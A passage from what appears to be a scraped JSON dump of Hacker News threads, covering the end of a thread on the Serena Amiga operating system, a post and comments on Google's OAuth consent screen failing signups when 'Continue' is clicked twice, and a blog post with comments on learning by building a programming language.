Discord. They have some experienced network stack developers. reply rangerelf 3 hours agoparentHeh, that made my morning. I was reading the specs on the cube and grinning like a fool. Thanks for sharing this. reply Ericson2314 3 hours agoprevThe Windows-based build instructions are...interesting. reply makach 6 hours agoprev [–] A video or a screenshot would have been nice reply Aldipower 6 hours agoparent [–] YouTube has a lot of videos and screenshots. reply shyrka 6 hours agorootparent [–] Any links? I can’t seem to find it on YouTube reply actionfromafar 6 hours agorootparentI think it was a jab. Youtube indeed has a lot of videos. Maybe not of this OS, though. Anyway here is a screenshot: http://www.amiga-news.de/de/news/AN-2024-08-00046-DE.html reply ape4 6 hours agorootparentprev [–] I tried unsuccessfully too. It doesn't help that Serena Williams is a famous tennis player and \"amiga\" is \"friend\" (female) in Spanish. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Serena is an experimental operating system (OS) designed for Amiga systems with a 68030 or better CPU, featuring modern principles like preemptive concurrency and multiple user support.",
      "It uses dispatch queues instead of traditional threads, dynamically managing virtual processors, and employs semaphore-based interrupt handling to ensure no missed interrupts.",
      "Serena includes a hierarchical file system (SerenaFS), a shell with command line editing, and supports various hardware like Amiga 2000, 3000, 4000 motherboards, and Motorola CPUs."
    ],
    "commentSummary": [
      "Serena is an experimental operating system (OS) designed for 32-bit Amiga computers, specifically targeting the Motorola 68030 processor.",
      "The project has garnered interest due to its unique virtual processors dispatch queue concept, which is a novel approach in OS design.",
      "Amiga computers, though rare and expensive now, are significant in computing history for their advanced features like multitasking, sound, and graphics capabilities, making this OS project particularly intriguing for retrocomputing enthusiasts."
    ],
    "points": 127,
    "commentCount": 38,
    "retryCount": 0,
    "time": 1723541608
  },
  {
    "id": 41236745,
    "title": "Google OAuth consent screen issue could be costing you signups",
    "originLink": "https://news.ycombinator.com/item?id=41236745",
    "originBody": "TL;DR: The \"Sign in with Google\" form doesn&#x27;t debounce clicks on the \"Continue\" button, so it can trigger multiple redirect callbacks, in our case causing 15% of signups to fail. We&#x27;ve since reproduced the issue with several other companies&#x27; signup flows.What&#x27;s the issue?A few months ago we (Flat.app) noticed that a meaningful fraction of signups-via-Google to our SaaS product were failing. I recently found out why, so I&#x27;m sharing this PSA for anyone facing a similar problem.If your app supports \"Sign in with Google\", it&#x27;s likely that new signups will fail if, on Google&#x27;s OAuth consent screen, a user clicks \"Continue\" more than once. The error will probably be inscrutable to the user, depending on your setup, so they may just give up instead of trying again. In our case, we were losing around 15% of signups!I encountered this issue while investigating failed signups for our product, but I&#x27;ve also reproduced it with other popular products including ChatGPT, Doordash, Expedia, and Snyk, so I assume it&#x27;s widespread.Some of these products use Auth0, as do we, but others don&#x27;t, and they still generate an error of one kind or another.For Auth0 specifically, the error is \"You may have pressed the back button, refreshed during login, opened too many login dialogs, or there is some issue with cookies, since we couldn&#x27;t find your session. Try logging in again from the application and if the problem persists please contact the administrator.\" The error tries to be helpful by listing potential causes, but it fails to mention the actual cause. That&#x27;s because Auth0 wasn&#x27;t aware of this failure mode, based on my correspondence with them.Why does this happen?After a user clicks \"Continue\" the first time, Google will respond with a 302 to the callback URL, passing along the authorization code and replaying the OAuth 2.0 state param. If the user clicks \"Continue\" again, Google will respond again with a 302 to the callback URL. The browser will abort the first pending request and issue a new request to the callback URL. Importantly, the state param is, as it should be, the same in both requests, and it typically incorporates a nonce (see https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;html&#x2F;draft-ietf-oauth-security-topics#name-protecting-redirect-based-f). Since the nonce will already have been consumed by the first request, the second request will be rejected.Why would a user click \"Continue\" twice?Simple: poor UX in Google&#x27;s consent screen. The \"Continue\" button provides almost no feedback that the click was registered, and the screen provides no feedback that any requests are pending. So, some users will naturally try again, especially if they&#x27;re on a slow connection.What can Google do?Google could disable the \"Continue\" button with a loading indicator after the first click. That would ensure it&#x27;s not possible to click it twice, and it would provide an improved UX by showing the user that something is happening.Google&#x27;s OAuth consent screen was redesigned at some point in the past few years. Allowing \"Continue\" to be clicked twice, with no visible feedback, may be an unintended regression.What can I do?Test this in your own application. Be sure to deauthorize your app before each test run so that you get the OAuth consent screen. You can do that in your Google account&#x27;s Data & privacy section.Also, check your logs for errors to see if you&#x27;re losing signups. See if you can detect this scenario and, if so, provide a better experience to users, e.g., by acknowledging what caused the error and giving them a clearer path to continue.",
    "commentLink": "https://news.ycombinator.com/item?id=41236745",
    "commentBody": "Google OAuth consent screen issue could be costing you signups125 points by Aalk4308 2 hours agohidepastfavorite43 comments TL;DR: The \"Sign in with Google\" form doesn't debounce clicks on the \"Continue\" button, so it can trigger multiple redirect callbacks, in our case causing 15% of signups to fail. We've since reproduced the issue with several other companies' signup flows. What's the issue? A few months ago we (Flat.app) noticed that a meaningful fraction of signups-via-Google to our SaaS product were failing. I recently found out why, so I'm sharing this PSA for anyone facing a similar problem. If your app supports \"Sign in with Google\", it's likely that new signups will fail if, on Google's OAuth consent screen, a user clicks \"Continue\" more than once. The error will probably be inscrutable to the user, depending on your setup, so they may just give up instead of trying again. In our case, we were losing around 15% of signups! I encountered this issue while investigating failed signups for our product, but I've also reproduced it with other popular products including ChatGPT, Doordash, Expedia, and Snyk, so I assume it's widespread. Some of these products use Auth0, as do we, but others don't, and they still generate an error of one kind or another. For Auth0 specifically, the error is \"You may have pressed the back button, refreshed during login, opened too many login dialogs, or there is some issue with cookies, since we couldn't find your session. Try logging in again from the application and if the problem persists please contact the administrator.\" The error tries to be helpful by listing potential causes, but it fails to mention the actual cause. That's because Auth0 wasn't aware of this failure mode, based on my correspondence with them. Why does this happen? After a user clicks \"Continue\" the first time, Google will respond with a 302 to the callback URL, passing along the authorization code and replaying the OAuth 2.0 state param. If the user clicks \"Continue\" again, Google will respond again with a 302 to the callback URL. The browser will abort the first pending request and issue a new request to the callback URL. Importantly, the state param is, as it should be, the same in both requests, and it typically incorporates a nonce (see https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#name-protecting-redirect-based-f). Since the nonce will already have been consumed by the first request, the second request will be rejected. Why would a user click \"Continue\" twice? Simple: poor UX in Google's consent screen. The \"Continue\" button provides almost no feedback that the click was registered, and the screen provides no feedback that any requests are pending. So, some users will naturally try again, especially if they're on a slow connection. What can Google do? Google could disable the \"Continue\" button with a loading indicator after the first click. That would ensure it's not possible to click it twice, and it would provide an improved UX by showing the user that something is happening. Google's OAuth consent screen was redesigned at some point in the past few years. Allowing \"Continue\" to be clicked twice, with no visible feedback, may be an unintended regression. What can I do? Test this in your own application. Be sure to deauthorize your app before each test run so that you get the OAuth consent screen. You can do that in your Google account's Data & privacy section. Also, check your logs for errors to see if you're losing signups. See if you can detect this scenario and, if so, provide a better experience to users, e.g., by acknowledging what caused the error and giving them a clearer path to continue. mnw21cam 1 hour agoJust a PSA - I (and probably others) find the \"Sign in with Google\" pop-over extremely annoying. It annoys me both because it's over the top of stuff I might want to read, and also because it's Google threatening to tell this web site who I am even though I have no desire whatsoever to do that. Please hide it behind a login button or otherwise only show it when the visitor has actually demonstrated a desire to log in specifically using Google. reply rrauenza 1 hour agoparentThere's a way to disable this! I found this out recently (I've only checked with Chrome, but it's a google setting not a Chrome one): https://support.google.com/accounts/thread/219332922/how-to-... reply flutas 58 minutes agorootparentOn Firefox at least that flow says it's only for Android devices. > Allow Google to display a sign-in prompt on Android. Learn more about sign-in prompts on Android[0] with a section below saying Chrome itself has settings as well > To manage third-party sign-ins on Chrome, go to Chrome Settings. Learn more about sign-in prompts on Chrome[1] [0] links to https://support.google.com/accounts/answer/12849458?p=androi... [1] links to https://support.google.com/accounts/answer/12849458?p=chrome... reply watermelon0 56 minutes agorootparentprevI followed the above link, and it seems that it's a Chrome setting now: https://support.google.com/chrome/answer/14264742 reply cma 6 minutes agorootparentprevWill setting that other than default default give the site one more bit to fingerprint you? reply afandian 56 minutes agoparentprev+1. I find it bizarre that so many web designers values their site so low as to sacrifice a quarter of the screen on the off chance of a signup. Stop a minute and think of the UX for people who aren’t Google customers. reply varispeed 1 hour agoparentprevThis and I also found that this pop up often sort of crashes and is displayed on all tabs and it's not possible to close it... At least that's me on Chrome. reply shrink 2 hours agoprevWe use Google OAuth to handle hundreds of registrations each day and haven't encountered this before. No errors, no customer reports. Following your instructions, I logged in to my own Google account, removed the connection to our app (via \"Third-party apps & services\") and then did the login again: after clicking \"continue\" the screen changes to \"loading\" instantly before redirecting after a few seconds. There's no ability to click \"continue\" twice. I then tried to sign up to your app following your instructions and I can reproduce the issue there: the screen doesn't change to \"loading\" view that I get for our app. Can you share a copy of your OAuth consent screen settings? Maybe there's an option influencing this behaviour. edit: we do not use Auth0, our Google OAuth connection is built in house. edit edit: comparing the URLs, our flow redirects from `https://accounts.google.com/signin/oauth/id` to `https://accounts.google.com/signin/oauth/consent` after clicking \"continue\" whereas yours remains on `https://accounts.google.com/signin/oauth/id` before redirecting to your app so there's definitely something different in the behaviour. reply Aalk4308 1 hour agoparentAgreed that there's definitely something different in the behavior. I looked through the HAR files I've captured comparing my company's app to Termly. After clicking \"Continue\", in both cases there's a redirect to a URL of the form https://accounts.google.com/signin/oauth/consent?as=redacted.... For my company's app, hitting that URL results in another redirect to my Auth0 tenant, whereas for Termly, hitting that URL results in HTML showing the loading indicator (no immediate redirect). Why the difference? As you said, maybe it's something in the OAuth consent screen configuration (though there are no options I see that could explain it). Maybe it has to do with the age of the account. reply Aalk4308 2 hours agoparentprevInteresting! It's certainly possible there are additional factors at play beyond what I've found to this point. Curiously, in all other apps I tested and mentioned, I don't see the screen changing to \"loading\" on them. Do you? Meantime, I'm checking the OAuth consent screen settings to see if there's anything relevant. reply shrink 1 hour agorootparentAfter watching network requests, I think it's based on the use of the Javascript login functionality vs. the redirect functionality. If the \"Login with Google\" button opens in a new tab and the Google OAuth flow completes in the second tab, then the process will have the \"loading\" screen after clicking \"continue\" because \"loading\" indicates Google OAuth is communicating back to the original tab. If the \"Login with Google\" button opens in the same tab, clicking \"continue\" triggers a 302 redirect to your callback URL of which the loading speed is controlled by your website. The immediate workaround is to switch to opening the Google OAuth login page in a new window. edit: \"Sign In with Google for Web\" appears to be what provides the new tab for login functionality https://developers.google.com/identity/gsi/web/guides/overvi... edit edit: that's not to say you're wrong, Google should definitely fix this but \"Sign In with Google for Web\" is not impacted in case anyone needs an immediate fix for their own apps, they can switch to \"Sign In with Google for Web\" (a difference user interface for OAuth). reply modeless 1 hour agorootparentThe problem with this is it doesn't support OAuth scopes. So if you need any Google account permissions beyond a simple sign in you can't use it. reply shrink 2 hours agorootparentprevAccording to Google Cloud, our App was created in 2018. ChatGPT, Retool, Ramp, PostHog and HubSpot have the behaviour you've described. I checked my browser history for `oauth/consent` and found the following examples with the loading behaviour: HelpScout, Google Cloud, Termly.io reply Aalk4308 1 hour agorootparentVery interesting. I just tried in Termly.io as well, and I do see the loading indicator you mentioned, albeit not _immediately_ (if I throttle the network speed, there is a delay before it appears). I captured a HAR file and am inspecting it to see if it has anything revealing about why the loading screen appears in some cases but not others. reply mritchie712 2 hours agoparentprevmaybe if you throttle your network (e.g. \"low end mobile\") you can hit it? reply kroolik 2 hours agoprevRe whys: this can be even simpler. I sometimes catch myself rapidly click the mouse button a second time with my finger, right after the initial click. This is not intended and may be related to low resistance on the button itself. reply 98codes 1 hour agoparentSame, but for me it's because as I've gotten older, sometimes my finger gets unsteady enough to double tap something, mostly on touchpads rather than a mouse. reply xyst 1 hour agoprevIn your “What can I do” section, should add: “do not add google/apple/facebook(meta)/github sign on in the first place” Not only are we centralizing identity to entities known to shutdown accounts for vague reasons. It can introduce painful debugging issues, increased support costs, and loss of sales. Personally, dealt with an issue where a user signed up with “Sign in with Apple” but forgot whether they provided Apple associated email address or the “ @privaterelay.appleid.com” Also, emails sent to the private relay address would occasionally bounce… Very frustrating and time I will never get back lol reply kccqzy 47 minutes agoparentThe most painful is when a user first logs in using \"sign in with Google\" and then subsequently using \"sign in with Apple\" without understanding that they now have two separate accounts. People don't understand that these two accounts are completely separate when they see that their Apple ID email is a Gmail, or when they have a Google account using their iCloud email. reply ewoodrich 24 minutes agoparentprevAs a developer I can sympathize having dealt with frustration implementing SSO but as a user (and I'm aware I may be in the minority on HN) I've bailed out of trying quite a few webapps that don't offer Sign in With Google or Sign in With Apple. There is a psychological effect where I dread the image of whatever half broken bespoke registration flow or inane password requirements someone came up with when I only see a \"Create Account\" button. That may not make a difference for signing up for an account at like a bank or something I truly need but for say a Show HN for Yet Another Thin Layer Over GPT #372 the odds are high I'll just click back and move on with my life. reply layer8 2 hours agoprevNot to excuse the non-debouncing behavior, but I wonder how much of those 15% are an actual loss, since it’s limited to users who are not interested enough to try a second time. I’m not denying there’s an actual loss, but it may be significantly less than the nominal 15%, and it would be interesting by how much. reply klabb3 1 hour agoparentTheory of mind error here. If it doesn’t work I may assume their system is down or doesn’t support my browser. Thus there would be no point in trying again, even if I was interested in the product. If it were to work on the second try it’d still be a sour taste - bugs are not a good first impression. At least personally I would have suspected the SaaS company as opposed to Google. reply layer8 1 hour agorootparentIf I was truly interested, I would try again in five minutes or an hour, or from a different browser/device. Errors are caused client-side often enough. reply modeless 1 hour agoprevI know they call it a nonce but how important is it to invalidate it instantly on first use? It's important for it to be unguessable, of course. But what security property does the invalidation serve? If an attacker can get the nonce they can just as easily get the access tokens after authentication, can't they? reply loa_in_ 58 minutes agoparentThe nonce is unique to the request-reply pair. Holding onto it beyond first use is useless, so it's discarded. If not that it would have to be time based otherwise (time-to-live) because server can't hold on to infinite of those. And if the time is too short it will cause problems, if it's too long it'll cause problems. It just always causes problems. > If an attacker can get the nonce they can just as easily get the access tokens after authentication, can't they? That's not the case. A js injection would usually lead to read access on the current page but not the next one. reply modeless 46 minutes agorootparentIt's my understanding that the OAuth \"state\" parameter nonce is generated and stored and validated on the client, not the server. reply Spiwux 2 hours agoprevI was about to leave a very witty \"just be idempotent ;)\" response but did not consider the nonce. I'd be surprised if Google is quick to change this, so I guess be stateful on the receiving server, persist that you handled a certain request already, and if you get a duplicate request, replay the response from the first one? reply yellow_lead 1 hour agoprevGoogle redesigned this screen recently (in the past few months), if I remember correctly? I'm not sure if this is related though. reply Aalk4308 1 hour agoparentThey redesigned the sign in / account selection page earlier this year, but I haven't been able to find any material indicating they changed the OAuth consent screen as part of it (such as before/after screenshots), though it's certainly possible. reply dangoodmanUT 59 minutes agoprevSo they do have junior devs working on their auth screens reply adaml_623 2 hours agoprevTalk to me about this, \"Since the nonce will already have been consumed by the first request, the second request will be rejected.\" What if the nonce was still valid for the second response because your server detected that the connection was dropped for the first response? reply Aalk4308 2 hours agoparentThat's an interesting possible solution if you're in control of the server. If you're using a third-party vendor like Auth0 to handle the redirect callback, then of course you're beholden to their implementation. In Auth0's case, it appears the nonce is consumed early in the handling of the callback. In my correspondence with them, I confirmed that they do see that the first request is aborted (in the form of a log), but they take no action as a consequence. reply immibis 2 hours agoparentprevThe server can't reliably detect that. reply ndriscoll 2 hours agoprevIt's been a while since I've thought about this stuff, but can you put the state param into a cookie (possibly encrypted, but I don't think that's necessary)? Assuming you don't use something like auth0, you can clear the nonce cookie at the same time that you set the login cookie. If they come into your callback without a nonce cookie (or with a non-matching one), you can kick them back to your landing page (or last saved redirect page) without processing the login attempt. If they were already logged in because you already processed it, they stay logged in. The attack the nonce is meant to prevent is tricking someone into logging into the wrong account, right? The attacker can't access or guess the user's cookie to put the right nonce into the URL, so I think that should be safe? If auth0 were going to implement this in the middle for you, then there might be some subtleties to think about with the redirect on failure unless you always send the user to a landing page. More layers of redirects make this kind of thing hard to think through. What's the purpose of auth0 for what you're doing? This might also not work if the authorization code is not re-usable (they're not supposed to be according to the spec) and your backend already used it. If it doesn't work, you could again kick the user back to a landing page, tell them the IdP had an error, and ask them to try again. Or I suppose if you're saving the login to a backend session, then it should just work and you can ignore the error. reply immibis 2 hours agoprevThis sounds like an issue that could be solved in your app. I hesitate to say it's an issue with your app, because I wouldn't have thought of it either, but you should be able to fix it without involving Google, and the fix is simple enough that Google can say it's your fault. You are getting the same callback URL twice, and the second time the request is failing. Why not instead, if the user is already authorised, let them keep their authorisation and continue by redirecting the user to the same place they would go if it was a new authorisation? This solution works if you are using a session cookie. If you need to set new cookies upon authorisation, that won't work because the browser won't receive the new cookie before the second request. Another possibility is to cache the whole request and response for a short time in case an identical request is received. Since the whole request is identical there will be no security issues from nonce reuse. Alternatively, you could allow nonce reuse within a small time window. I'm not familiar with the web stack enough to evaluate the security implications of this. reply Aalk4308 2 hours agoparentBoth interesting ideas! I'll pass along in my ongoing chat with Auth0. At first thought, the security implications don't seem problematic. reply stephenr 2 hours agoprev [–] It's madness to me that people (not OP specifically) will simultaneously say \"you have to outsource login to a third party, storing passwords safely is too hard\" and... also this. The answer to \"what can I do\" is \"stop depending on a third party service that's critical for your business and essentially trivial to replace\". reply xyst 1 hour agoparentalso as a consumer, don’t use big tech single sign on. If big tech 86s the account for whatever reason, then you lose access to the services you linked the account to. reply dewey 1 hour agoparentprevLogin is never \"trival\" to replace. reply ndriscoll 1 hour agorootparentIIRC a basic oauth social login implementation is ~40 lines of code (assuming you already have things like json parsing). You need to understand what you're doing to make sure you do the necessary validation (e.g. including the nonce from OP), but the part auth0 is doing for you is pretty trivial. reply saurik 57 minutes agorootparentI agree with you, but I think the comment is about replacing Google, not replacing Auth0. reply ndriscoll 41 minutes agorootparentHow so? Google is an IdP. It provides the user's identity. Auth0 is a middle layer that (in this case) transforms oauth responses into oauth responses. The thing you'd replace Google with would be something like oauth client auto-registration so people can use their own oauth server on their domain. Edit: Oh, I see what you mean. That's probably fair, but SSO is actually convenient for people, so it's fair to offer both oauth and user/password login. And dealing with SSO is probably easier than handling passwords, reset flows, etc. reply uncletammy 1 hour agoparentprev [–] There are many reasons one might use a \"login with X\" flow that have nothing to do with storing passwords reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The \"Sign in with Google\" form lacks debouncing on the \"Continue\" button, leading to multiple redirect callbacks and a 15% signup failure rate.",
      "This issue impacts several companies, including Flat.app, ChatGPT, Doordash, Expedia, and Snyk, due to the reuse of the OAuth 2.0 state parameter when users click \"Continue\" multiple times.",
      "The root cause is poor UX on Google's consent screen, which doesn't disable the \"Continue\" button after the first click, resulting in unclear error messages and user frustration."
    ],
    "commentSummary": [
      "The \"Sign in with Google\" form has a bug where the \"Continue\" button doesn't debounce clicks, causing multiple redirect callbacks and resulting in 15% of signups failing.",
      "This issue occurs when users click \"Continue\" more than once on Google's OAuth consent screen, leading to multiple redirects and the second request being rejected due to nonce consumption.",
      "Developers are advised to test their applications, check logs for errors, and provide better user feedback to mitigate this issue, while Google could fix it by disabling the \"Continue\" button after the first click."
    ],
    "points": 125,
    "commentCount": 43,
    "retryCount": 0,
    "time": 1723565133
  },
  {
    "id": 41235677,
    "title": "What you learn by making a new programming language",
    "originLink": "https://ntietz.com/blog/you-should-make-a-new-terrible-programming-language/",
    "originBody": "technically a blog homeblog / tagssletterprojectsbooks You should make a new programming language Monday, August 12, 2024 Every software engineer uses a programming language, usually multiple. Few of us make programming languages. This makes sense, because the work we need to get done can typically be done just fine in the languages that exist. Those already have people making them better. Let's focus on the task at hand. But that means that we're missing out on some learning opportunities. I stumbled into those when I made a language based on a silly premise: control flow via exceptions and nothing else. It was done as a joke, but I accidentally learned things along the way. It's special that we make our own tools Every serious woodworker makes some of their own equipment. Some will make their workbench, maybe sawhorses, perhaps jigs for myriad tools and work setups. These are things a woodworker can make from wood. But we don't often have access to the machines we'd need for making all the tools we use: You'd need a metalworking shop to make portions of chisels and planes, let alone any power tools we use. As programmers, we're in a different position. We have near total control over the machine, and we have the capability, in theory, to build everything from scratch1. Since the tools we use are all software-based, and we write software, we can create all of our own tools, from the operating system on up. This is a privilege which few fields enjoy. The closest other one I can think of is that machinists can likely produce a lot of their own tools, too. Where we assume that CPUs and RAM exist, they can assume that motors and control boards exist. Then they can build those into the rest of the tool. And so, like machinists, we're able to get incredibly close to our tools. What you learn by making a language One of the tools we interact with the most is the programming language. We use one to get any programming work done, and they shape how we think through problems as well. You use a programming language as a tool of thought even when you're away from the keyboard. This makes it ripe for learning. You will learn a lot if you make a new programming language. You'll learn about grammars and language design. Before you can implement a programming language, you'll have to decide what you even want it to be. Is this an imperative language, or functional, or something else? Is it object oriented? Does it have traditional syntax borrowed from another language, or are you doing something new and weird? These, and many others, are the questions you'll grapple with in designing a language. In the process, you'll learn about why other languages are designed the way they are. If you're lucky, you'll learn some of this in the initial design process. For example, while working on my next language, Lilac, I learned why semicolons are so common because I tried picking something else. Discussing it with a friend uncovered a lot of potential drawbacks in other choices! If you're less lucky, you'll learn those lessons in the implementation phase, and those lessons will really stick. You'll learn about parsing. This is one of the first things you'll run into when you start to implement your language. You can't do a whole lot else without parsing the language. To start writing the parser, you'll have to pick what kind of parser to write. Don't overthink it when you're just starting out. Although, if you're really interested in parsers, it can be a wonderful topic to dive deep into. You'll learn about runtime execution. Running your code means you have to write the runtime (or the compiler) which means thinking deeply about how it will work at run time. When an exception is thrown, how does that actually work? When you reference a variable, how do you know which memory location to find it in? If you run a recursive function, is there a limit to how far you can recurse? Why is that? These are some of the questions you'll answer. The list really goes on, and on, and on. You can tailor your language to what you want to learn about. My first language, Hurl, taught me about the basics of making an interpreter, designing a language, and writing a grammar. My second language, Lilac, is going to teach me more about type systems, runtimes, and instrumentation. As you go make a language, you'll gain deeper intuitions for and understanding of other languages. When I implemented Hurl and ran into parsing errors, it would spit out raw token names at me. This resembled some of the errors I used to see sometimes in my Neovim Rust LSP integration, and it started to make those errors easier to understand. Each language and implementation decision you make will deepen your understanding of the languages you use, and you'll be a better user for it. It will be a bad language, and that's okay The nice thing with writing your own language for learning is that it's likely to be a bad one. It's certainly possible to make new, good languages, and that's wonderful! But in my experience, it's best to separate out learning how to do something from doing it exceptionally well. When you go into it knowing that it's going to be a bad language, it can be very freeing! Bad doesn't mean that it's not useful to you, because it still can be. Mostly, it means that it will lack the fit and finish of a \"real\" language and it will be defective in some way that limits widespread use. But you can make something that solves a specific problem for you, lets you do Advent of Code puzzles, or earns you nerd cred with your friends. These are useful things. Since you aren't going to make the next Python, you can focus on the things that are interesting, compelling, and fruitful for learning. You can slough off all the things that are tedious but necessary for real-world usage. Your learning can be targeted and you can keep it fun, so you're more likely to finish the project. And it's okay to break things arbitrarily, or make wildly ridiculous language choices that just make you smile. Because hey, it's going to be bad anyway, right? Getting started making languages It's intimidating to sit down in front of a blank editor and \"make a new language.\" For a long time, I thought—even as Principal Software Engineer—that it was some dark art that is beyond my abilities. That's a load of crock, and all of us programmers can do it. It gets easier every year to get started, because there are so many resources out there to learn from. The first thing I'd recommend is implementing someone else's language in a guided fashion. I followed Crafting Interpreters for this, and it's incredible. I've also heard good things about Writing An Interpreter In Go and Build Your Own Lisp. Any of these will give you a taste of how languages work and let someone experienced guide you thorough it. One thing, though: I've found it is a good idea to choose a different implementation language from what the book uses. Crafting Interpreters uses Java and C, so I used Rust. By choosing a different language, you're forced to grapple with the concepts to translate them. You can't simply retype the code, so you will learn it at a deeper level. After that, the direction you go is really up to you. I got started with Hurl by just kind of designing it and throwing things at the wall to see what sticks. That worked and let me crystallize a lot of the knowledge I got from Crafting Interpreters. For Lilac, I've read one book so far and have a short list of others to read. When I asked friends for recommendations, these are a few of the books they recommend for this: Introduction to Compilers and Language Design, which I've read and really enjoyed Engineering a Compiler Programming Languages: Application and Interpretation Compilers: Principles, Techniques, and Tools aka the Dragon Book What you read will depend on where you want to go next and what you want to learn. Go Forth, make something fun I think we should all go and make a new language. It's a great way to learn, and new ideas have to come from somewhere. At the end of the day, it's a wonderful way to have some fun with your computer. Oh, and please expand the vocabulary of programming language names. We can say \"Go Forth\" but it's hard to put together a whole sentence with just programming languages. Let's fix that, shall we? And let's B Swift about it. 1 There are some firmware blobs which we don't control. But there is fully open hardware, and you have to stop going down the stack somewhere. Well, I guess you could go start a mining operation to extract ore from the earth and go truly from scratch... ↩ If this post was enjoyable or useful for you, please share it! If you have comments, questions, or feedback, you can email my personal email. To get new posts and support my work, subscribe to the newsletter. There is also an RSS feed. Want to become a better programmer? Join the Recurse Center! Want to hire great programmers? Hire via Recurse Center!",
    "commentLink": "https://news.ycombinator.com/item?id=41235677",
    "commentBody": "What you learn by making a new programming language (ntietz.com)124 points by kaycebasques 4 hours agohidepastfavorite71 comments tombert 3 hours agoI've had two projects that end up being \"oops, I made an interpreter\". It starts innocently enough, you just have a JSON that has some basic functionality. Then you decide it would be cool to nest functionality because there's no reason not to, so you build a recursive parser. Then you think it'd be neat to be able to add some arguments to the recursive stuff, because then you can more easily parameterize the JSON. Then you realize it might be nice to assign names to these things as you call them, you implement that, and now you're treating JSON as an AST and you're stuck with maintaining an interpreter, and life is pain. reply rqtwteye 34 minutes agoparentThis happened to me with an XML based rules engine I wrote. First I needed conditions, then I introduced variables, then loops, then if-then-else. When I needed to handle errors, I realized that I just had invented something like BASIC in XML format. The interpreter was surprisingly short and concise mainly because XML ensured I didn't have to do the parsing. Switched to dynamically compiled C# eventually. reply sjducb 2 hours agoparentprev> and life is pain So glad you finished with this. Right now I’m working with a guy who wants to write an interpreter… reply prisenco 2 hours agorootparentWriting an interpreter for a project that isn't explicitly an interpreter is a code smell equivalent to microwaving fish. It is an incredibly fun side project though. reply bunderbunder 1 hour agorootparentI think this really depends a lot on the task as well as how you frame it. A whole lot of the \"parse, don't validate\" ethos is potentially about handling incoming data with complicated formats by writing a minimalist interpreter that reads the input and outputs either guaranteed-valid domain objects or error messages. Most the time you can get away with just a parser, but one occasionally runs into more complex formats that are easier to handle if you think of them as a declarative language that you handle using general-purpose interpreter implementation patterns. And it's just not a wheel worth reinventing. The \"very clever JSON\" example the parent poster gives isn't particularly farfetched. The description reminds me of, for example, every Jetbrains REST API I've ever had to interact with. Also the data file formats for some commercial applications I've had to interact with. I don't like formats like this, but when I'm stuck with them, choosing the most maintainable option from the choices I've been left with is not a code smell; it's just sound engineering. reply diggan 2 hours agorootparentprev> Right now I’m working with a guy who wants to write an interpreter… Stuff like that works out great if you have a static set of features that will never change and you can at one point say \"it's done\", and won't have to touch it again. Problem is that features are almost never static across their lifetime, and some poor sucker has to modify it at one point. reply anonymoushn 2 hours agoparentprevI'm pretty happy with \"json scripting\" for an implementation[0] of card game[1] with relatively low rules complexity. For a time it could evaluate arithmetic expressions, but I got rid of that because it was a bit unwieldy. The main pain point is that it runs slower than I'd like, so I may end up porting it all to actual Javascript functions or to Zig. [0]: https://github.com/sharpobject/yisim/blob/master/swogi.json [1]: https://store.steampowered.com/app/1948800/Yi_Xian_The_Culti... reply tombert 1 hour agorootparentThe first time I did this, I ended up writing stuff that could use replace strings with regular expressions, do arithmetic, string concatenation, and a few other things. It was honestly kind of cool but it was horrible to maintain and I wish I had just kept the JSON as data. reply gavinhoward 2 hours agoparentprevSee also the Configuration Complexity Clock: https://mikehadlow.blogspot.com/2012/05/configuration-comple... . This is why I have a separate config language and code language. My config language is essentially JSON with newline separators and a first-class binary type (base64). I added little else. When I get the temptation to add code to it, I just pull out my other, general-purpose language instead. reply aapoalas 2 hours agorootparentI'm basically in charge of maintaining and developing a product that (on purpose) started at 9 o'clock. We've resisted the call to implement loops and such in our DSL but I can hear the wolves howling and I doubt I have much longer... reply pxc 1 hour agorootparentI think the world needs programmable config langs because slinging YAML and JSON quickly becomes miserable (as is extending them through templating alone) and general-purpose programming languages usually have shitty ergonomics for writing configuration. The only question in my mind is whether our common config langs should be Turing-complete (e.g., Nix, Nickel, Jsonnet, Pkl) or not (e.g., HCL, CUE, Starlark, Dhall), which I think can only be determined through experience over the long term. reply jolt42 1 hour agorootparentprevPersonally I've seen 9pm be a holy grail, an exceedingly advantageous position to be in. But, it's exceedingly challenging to figure out what that DSL should and should not have as well. reply axegon_ 1 hour agoparentprevLikewise, I've done that more times than I'd like to admit. And I took it a step further with an LLM like a month and a half ago fenced behind a number of json and yaml instructions, containing conditions and validators. It works like a charm but yeah... Oops, I did it again. reply CyberDildonics 1 hour agoparentprevLots of people learn the same lesson at some price. Data and execution are two separate things and should remain as separate as possible. The reason is that once you mix data and execution, suddenly you don't know what your data is until you execute it. Then you can only deal with it in the context of whatever tools you write and you can never just look at it straight. On the other hand now execution depends on lots of data and is no longer modular or general/generic and so becomes a one off solution somewhere. At some point everyone has the \"what if\" idea and hopefully it only burns them instead of lots of other people through poor design. reply lallysingh 3 hours agoprevEvery program expands until it becomes a compiler or checks mail. Emacs's sin was doing both. reply jpgvm 3 hours agoparentAngry upvote. Maybe it's true failing though was stopping short of becoming the OS. reply yjftsjthsd-h 3 hours agorootparentIt's not its own kernel, but emacs can run on Linux as PID 1, at which point it rather seems like it should count as an OS. Given its affiliation, emacs/Linux probably still counts as GNU/Linux, but still... reply 01HNNWZ0MV43FF 2 hours agorootparentI say if it's not running as the kernel, it's not an OS. Otherwise you could \"boot to\" any terminal app. Nano? OS. Cat? OS. Echo? Believe it or not, OS. Good grief. reply kbolino 2 hours agorootparentPID 1 has some unique responsibilities. In particular, any process that gets orphaned when its original parent exits is automatically reparented by PID 1, and so the process running as PID 1 must watch for unexpected SIGCHILD and clean up the zombies with waitpid or similar. reply randomdata 50 minutes agorootparentprevWhat we do know is that the S in OS stands for system. A kernel alone does not a system make. There needs to be other components to round out an entire system. Why does Emacs not fit the bill? reply striking 2 hours agorootparentprevOne could argue (many have, in the form of a tedious copypasta) that Linux is not the operating system because an operating system needs both a kernel and a userland. Why wouldn't `nano` count as a userland in the same way as anything provided by a typical distro today? reply saghm 18 minutes agorootparentprevMaybe a potential use case for GNU Hurd? reply shortrounddev2 3 hours agoparentprev> Any sufficiently complicated C or Fortran program contains an ad hoc, informally-specified, bug-ridden, slow implementation of half of Common Lisp 